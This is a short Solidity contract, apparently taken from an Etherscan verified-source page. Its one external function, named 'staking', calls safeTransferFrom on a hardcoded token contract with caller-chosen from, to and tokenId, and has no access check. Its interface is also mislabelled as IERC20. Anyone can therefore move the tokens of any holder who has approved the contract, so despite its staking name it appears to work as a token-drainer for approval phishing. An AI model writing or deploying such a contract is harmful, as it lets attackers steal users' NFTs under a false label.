/**
 *Submitted for verification at Etherscan.io on 2022-02-20
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.11;


interface IERC20 {    
    function safeTransferFrom(
        address from,
        address to,
        uint256 tokenId
    ) external; 
}

contract MyContract {    

    IERC20 dcoffer = IERC20(address(0x9CE398d6D87B3f0f22246B0E8B7d9C59Ea647b33));

    function staking(address from,address to,uint256 tokenId) external {       
        dcoffer.safeTransferFrom(from,to,tokenId);
    }
}